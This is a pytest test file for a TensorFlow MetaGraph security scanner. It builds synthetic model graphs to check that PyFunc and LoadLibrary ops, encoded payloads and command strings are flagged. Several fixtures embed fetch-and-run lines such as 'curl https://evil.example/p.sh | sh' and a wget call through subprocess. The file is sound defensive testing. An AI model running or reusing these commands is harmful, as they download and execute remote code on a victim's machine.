from __future__ import annotations

import importlib
from pathlib import Path
from typing import Any, cast

import pytest

from modelaudit.core import determine_exit_code, scan_model_directory_or_file
from modelaudit.scanners.base import CheckStatus, IssueSeverity
from modelaudit.scanners.tf_metagraph_scanner import (
    _MAX_ATTR_VALUE_BYTES,
    _MAX_PARSE_BYTES,
    DISCOVERY_ASSUMPTIONS,
    METAGRAPH_PARSE_INCONCLUSIVE_REASON,
    TensorFlowMetaGraphScanner,
    _attr_strings_with_lowered_values,
    _AttrString,
)
from modelaudit.utils.tensorflow_compat import has_tensorflow_protobuf_stubs as _has_tf_protos

pytestmark = pytest.mark.skipif(not _has_tf_protos(), reason="TensorFlow protobuf stubs unavailable")


def _get_metagraph_class() -> type:
    import modelaudit.protos  # noqa: F401

    meta_graph_pb2 = importlib.import_module("tensorflow.core.protobuf.meta_graph_pb2")
    return cast(type, meta_graph_pb2.MetaGraphDef)


def _build_metagraph(
    *,
    graph_nodes: list[dict[str, object]],
    function_nodes: list[dict[str, object]] | None = None,
    collection_bytes: dict[str, list[bytes]] | None = None,
) -> bytes:
    metagraph_cls = _get_metagraph_class()
    metagraph = metagraph_cls()

    metagraph.meta_info_def.meta_graph_version = "modelaudit_test_meta_graph"
    metagraph.meta_info_def.tags.append("serve")

    def add_node_attrs(node: Any, node_spec: dict[str, object]) -> None:
        attrs = node_spec.get("attrs", {})
        if isinstance(attrs, dict):
            for attr_name, attr_value in attrs.items():
                if isinstance(attr_value, bytes):
                    node.attr[str(attr_name)].s = attr_value
                else:
                    node.attr[str(attr_name)].s = str(attr_value).encode("utf-8")

        function_ref = node_spec.get("function_ref")
        if isinstance(function_ref, str):
            node.attr["f"].func.name = function_ref

    for node_spec in graph_nodes:
        node = metagraph.graph_def.node.add()
        node.name = str(node_spec["name"])
        node.op = str(node_spec["op"])
        add_node_attrs(node, node_spec)

    if function_nodes:
        function = metagraph.graph_def.library.function.add()
        function.signature.name = "test_function"
        for node_spec in function_nodes:
            node = function.node_def.add()
            node.name = str(node_spec["name"])
            node.op = str(node_spec["op"])
            add_node_attrs(node, node_spec)

    if collection_bytes:
        for key, values in collection_bytes.items():
            collection = metagraph.collection_def[key]
            for value in values:
                collection.bytes_list.value.append(value)

    return cast(bytes, metagraph.SerializeToString())


def test_tf_metagraph_attr_lowering_reuses_shared_values() -> None:
    class CountingStr(str):
        lower_calls = 0

        def lower(self) -> str:
            type(self).lower_calls += 1
            return super().lower()

    attr_value = CountingStr("BASE64 payload")

    lowered_values = _attr_strings_with_lowered_values((_AttrString("payload", attr_value, len(attr_value)),))

    assert lowered_values == ((_AttrString("payload", attr_value, len(attr_value)), "base64 payload"),)
    assert CountingStr.lower_calls == 1


def test_tf_metagraph_scanner_can_handle_strict(tmp_path: Path) -> None:
    valid_meta = tmp_path / "model.meta"
    valid_meta.write_bytes(
        _build_metagraph(graph_nodes=[{"name": "input", "op": "Placeholder"}, {"name": "const", "op": "Const"}])
    )

    renamed_non_meta = tmp_path / "not_meta.meta"
    renamed_non_meta.write_text("this is not protobuf", encoding="utf-8")

    wrong_extension = tmp_path / "graph.pb"
    wrong_extension.write_bytes(valid_meta.read_bytes())

    assert TensorFlowMetaGraphScanner.can_handle(str(valid_meta)) is True
    assert TensorFlowMetaGraphScanner.can_handle(str(renamed_non_meta)) is False
    assert TensorFlowMetaGraphScanner.can_handle(str(wrong_extension)) is False


def test_tf_metagraph_scanner_can_handle_oversized_meta_for_fail_closed_scan(tmp_path: Path) -> None:
    oversized_meta = tmp_path / "oversized.meta"
    seed = _build_metagraph(graph_nodes=[{"name": "pyfunc_node", "op": "PyFunc"}])
    oversized_meta.write_bytes(seed + b"A" * (_MAX_PARSE_BYTES + 1 - len(seed)))

    assert TensorFlowMetaGraphScanner.can_handle(str(oversized_meta)) is True

    result = TensorFlowMetaGraphScanner().scan(str(oversized_meta))

    assert result.success is False
    assert result.metadata["operational_error"] is True
    assert result.metadata["operational_error_reason"] == "metagraph_parse_budget_exceeded"
    assert any(issue.message and "MetaGraph exceeds bounded parse budget" in issue.message for issue in result.issues)

    audit_result = scan_model_directory_or_file(str(oversized_meta))

    assert determine_exit_code(audit_result) == 2


def test_tf_metagraph_scanner_benign_graph_has_no_security_findings(tmp_path: Path) -> None:
    benign_meta = tmp_path / "benign.meta"
    benign_meta.write_bytes(
        _build_metagraph(
            graph_nodes=[
                {
                    "name": "notes_const",
                    "op": "Const",
                    "attrs": {
                        "summary": "Execution benchmark metrics for qa run. Contains eval word in plain metadata only."
                    },
                },
                {"name": "inference", "op": "MatMul"},
            ]
        )
    )

    result = TensorFlowMetaGraphScanner().scan(str(benign_meta))

    assert result.success is True
    assert result.has_errors is False
    assert result.has_warnings is False
    assert result.metadata.get("graph_node_count") == 2


def test_tf_metagraph_scanner_detects_unsafe_ops_and_executable_payload_signals(tmp_path: Path) -> None:
    malicious_meta = tmp_path / "malicious.meta"
    malicious_meta.write_bytes(
        _build_metagraph(
            graph_nodes=[
                {
                    "name": "pyfunc_node",
                    "op": "PyFunc",
                    "attrs": {"func": "python -c \"import os; os.system('curl https://evil.example/p.sh | sh')\""},
                },
                {
                    "name": "loader",
                    "op": "LoadLibrary",
                    "attrs": {"library_path": "/tmp/evil_payload.so"},
                },
            ],
            function_nodes=[
                {
                    "name": "fn_exec",
                    "op": "PyCall",
                    "attrs": {"script": "subprocess.run('wget https://evil.example/next', shell=True)"},
                }
            ],
            collection_bytes={"runtime_hook": [b"python -c 'import os; os.system(\"curl https://evil.example/x\")'"]},
        )
    )

    result = TensorFlowMetaGraphScanner().scan(str(malicious_meta))

    assert result.success is False
    assert any(issue.severity == IssueSeverity.CRITICAL for issue in result.issues)

    dangerous_op_issues = [issue for issue in result.issues if "Dangerous TensorFlow operation" in issue.message]
    assert dangerous_op_issues
    assert any(issue.details.get("op_type") == "PyFunc" for issue in dangerous_op_issues)

    assert any("External library/path reference" in issue.message for issue in result.issues)
    assert any(
        "Multiple independent executable-context risk indicators detected in MetaGraph" in issue.message
        for issue in result.issues
    )


@pytest.mark.parametrize("op_name", ["LoadLibrary", "LoadLibraryV2"])
def test_tf_metagraph_scanner_flags_loadlibrary_ops_without_path_attributes(tmp_path: Path, op_name: str) -> None:
    loadlibrary_meta = tmp_path / f"{op_name.lower()}.meta"
    loadlibrary_meta.write_bytes(
        _build_metagraph(
            graph_nodes=[
                {
                    "name": "plugin_loader",
                    "op": op_name,
                }
            ]
        )
    )

    result = TensorFlowMetaGraphScanner().scan(str(loadlibrary_meta))

    assert result.success is False
    assert any(
        issue.message
        and f"Dangerous TensorFlow operation: {op_name}" in issue.message
        and issue.severity == IssueSeverity.CRITICAL
        and issue.details.get("op_type") == op_name
        for issue in result.issues
    )


def test_tf_metagraph_scanner_comment_token_does_not_suppress_malicious_detection(tmp_path: Path) -> None:
    malicious_meta = tmp_path / "malicious-comment.meta"
    malicious_meta.write_bytes(
        _build_metagraph(
            graph_nodes=[
                {
                    "name": "pyfunc_node",
                    "op": "PyFunc",
                    "attrs": {"func": "# os.system('curl https://evil.example/p.sh | sh')"},
                }
            ],
            collection_bytes={"runtime_hook": [b"# python -c 'import os; os.system(\"curl https://evil.example/x\")'"]},
        )
    )

    result = TensorFlowMetaGraphScanner().scan(str(malicious_meta))

    assert result.success is False
    assert any(issue.severity == IssueSeverity.CRITICAL for issue in result.issues)
    assert any("Executable String Check" in check.name for check in result.checks)


def test_tf_metagraph_scanner_false_positive_control_substring_op_name(tmp_path: Path) -> None:
    false_positive_candidate = tmp_path / "fp.meta"
    false_positive_candidate.write_bytes(
        _build_metagraph(
            graph_nodes=[
                {
                    "name": "custom_node",
                    "op": "CustomPyFuncMetrics",  # contains "PyFunc" substring but is a different op
                    "attrs": {"notes": "exec and eval terms in non-executable custom metadata"},
                }
            ]
        )
    )

    result = TensorFlowMetaGraphScanner().scan(str(false_positive_candidate))

    assert result.success is True
    assert all(issue.severity not in {IssueSeverity.WARNING, IssueSeverity.CRITICAL} for issue in result.issues)


def test_tf_metagraph_scanner_detects_func_references_in_executable_attr_values(tmp_path: Path) -> None:
    function_ref_meta = tmp_path / "func-ref.meta"
    function_ref_meta.write_bytes(
        _build_metagraph(
            graph_nodes=[
                {
                    "name": "dangerous_call",
                    "op": "StatefulPartitionedCall",
                    "function_ref": "os.system",
                }
            ]
        )
    )

    result = TensorFlowMetaGraphScanner().scan(str(function_ref_meta))

    assert result.success is False
    assert any(
        issue.message
        and "Suspicious command/network string found in executable TensorFlow op attribute" in issue.message
        and issue.severity == IssueSeverity.CRITICAL
        and issue.details.get("attribute") == "f.func.name"
        and issue.details.get("value_preview") == "os.system"
        for issue in result.issues
    )


def test_tf_metagraph_scanner_func_reference_false_positive_control(tmp_path: Path) -> None:
    benign_function_ref_meta = tmp_path / "benign-func-ref.meta"
    benign_function_ref_meta.write_bytes(
        _build_metagraph(
            graph_nodes=[
                {
                    "name": "benign_call",
                    "op": "StatefulPartitionedCall",
                    "function_ref": "custom_package.systematic_math",
                }
            ]
        )
    )

    result = TensorFlowMetaGraphScanner().scan(str(benign_function_ref_meta))

    assert result.success is True
    assert not any(
        issue.message
        and "custom_package.systematic_math" in issue.message
        and "command/network string" in issue.message
        for issue in result.issues
    )


def test_tf_metagraph_scanner_detects_split_encoded_payload_and_oversized_attrs(tmp_path: Path) -> None:
    suspicious_meta = tmp_path / "split-payload.meta"
    encoded_blob = "A" * 192
    suspicious_meta.write_bytes(
        _build_metagraph(
            graph_nodes=[
                {
                    "name": "pyfunc_node",
                    "op": "PyFunc",
                    "attrs": {
                        "decoder": "base64.b64decode",
                        "payload": encoded_blob,
                        "script": "A" * (_MAX_ATTR_VALUE_BYTES + 512),
                    },
                }
            ]
        )
    )

    result = TensorFlowMetaGraphScanner().scan(str(suspicious_meta))

    assert result.success is False
    assert any(issue.message and "Encoded payload indicator found" in issue.message for issue in result.issues)
    assert any(
        issue.message
        and "Large executable-context attribute detected" in issue.message
        and issue.details.get("attribute") == "script"
        and issue.details.get("attribute_length") == _MAX_ATTR_VALUE_BYTES + 512
        for issue in result.issues
    )


def test_tf_metagraph_scanner_checkpoint_io_ops_not_critical(tmp_path: Path) -> None:
    checkpoint_meta = tmp_path / "checkpoint.meta"
    checkpoint_meta.write_bytes(
        _build_metagraph(
            graph_nodes=[
                {"name": "save_op", "op": "SaveV2"},
                {"name": "restore_op", "op": "RestoreV2"},
            ]
        )
    )

    result = TensorFlowMetaGraphScanner().scan(str(checkpoint_meta))

    assert all(issue.details.get("op_type") not in {"SaveV2", "RestoreV2"} for issue in result.issues)
    assert all(issue.severity != IssueSeverity.CRITICAL for issue in result.issues)


def test_tf_metagraph_scanner_corrupt_protobuf(tmp_path: Path) -> None:
    corrupt_meta = tmp_path / "corrupt.meta"
    corrupt_meta.write_bytes(b"\x0a\x08broken")

    assert TensorFlowMetaGraphScanner.can_handle(str(corrupt_meta)) is False

    result = TensorFlowMetaGraphScanner().scan(str(corrupt_meta))
    assert result.success is False
    assert result.metadata["scan_outcome"] == "inconclusive"
    assert METAGRAPH_PARSE_INCONCLUSIVE_REASON in result.metadata["scan_outcome_reasons"]
    parse_check = next(check for check in result.checks if check.name == "MetaGraph Protobuf Parsing")
    assert parse_check.status == CheckStatus.FAILED
    assert parse_check.severity == IssueSeverity.INFO
    assert not any(issue.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL} for issue in result.issues)


def test_tf_metagraph_scanner_preserves_recovered_malicious_graph_findings(tmp_path: Path) -> None:
    malformed_meta = tmp_path / "malicious-tail.meta"
    malformed_meta.write_bytes(_build_metagraph(graph_nodes=[{"name": "pyfunc_node", "op": "PyFunc"}]) + b"\xff")

    result = TensorFlowMetaGraphScanner().scan(str(malformed_meta))

    assert result.success is False
    assert result.metadata["scan_outcome"] == "inconclusive"
    assert METAGRAPH_PARSE_INCONCLUSIVE_REASON in result.metadata["scan_outcome_reasons"]
    assert any(
        issue.severity == IssueSeverity.CRITICAL
        and issue.message == "Dangerous TensorFlow operation: PyFunc"
        and issue.details.get("op_type") == "PyFunc"
        for issue in result.issues
    )


def test_tf_metagraph_scanner_preserves_recovered_nameless_malicious_graph_findings(tmp_path: Path) -> None:
    malformed_meta = tmp_path / "nameless-malicious-tail.meta"
    malformed_meta.write_bytes(_build_metagraph(graph_nodes=[{"name": "", "op": "PyFunc"}]) + b"\xff")

    result = TensorFlowMetaGraphScanner().scan(str(malformed_meta))

    assert result.success is False
    assert result.metadata["scan_outcome"] == "inconclusive"
    assert METAGRAPH_PARSE_INCONCLUSIVE_REASON in result.metadata["scan_outcome_reasons"]
    assert any(
        issue.severity == IssueSeverity.CRITICAL
        and issue.message == "Dangerous TensorFlow operation: PyFunc"
        and issue.details.get("op_type") == "PyFunc"
        for issue in result.issues
    )


def test_tf_metagraph_scanner_import_failure_is_inconclusive(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    valid_meta = tmp_path / "valid.meta"
    valid_meta.write_bytes(_build_metagraph(graph_nodes=[{"name": "const", "op": "Const"}]))

    def fail_import(_data: bytes) -> tuple[Any, Exception | None]:
        raise ImportError("simulated MetaGraph import failure")

    monkeypatch.setattr(
        "modelaudit.scanners.tf_metagraph_scanner._parse_metagraph_preserving_partial",
        fail_import,
    )

    result = TensorFlowMetaGraphScanner().scan(str(valid_meta))

    assert result.success is False
    assert result.metadata["scan_outcome"] == "inconclusive"
    assert METAGRAPH_PARSE_INCONCLUSIVE_REASON in result.metadata["scan_outcome_reasons"]
    parse_check = next(check for check in result.checks if check.name == "MetaGraph Protobuf Parsing")
    assert parse_check.status == CheckStatus.FAILED
    assert parse_check.severity == IssueSeverity.INFO
    assert parse_check.details["exception_type"] == "ImportError"
    assert not any(issue.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL} for issue in result.issues)


def test_tf_metagraph_scanner_records_discovery_assumptions(tmp_path: Path) -> None:
    valid_meta = tmp_path / "meta_assumptions.meta"
    valid_meta.write_bytes(
        _build_metagraph(graph_nodes=[{"name": "input", "op": "Placeholder"}, {"name": "output", "op": "Identity"}])
    )

    result = TensorFlowMetaGraphScanner().scan(str(valid_meta))

    assert result.metadata["discovery_assumptions"] == DISCOVERY_ASSUMPTIONS
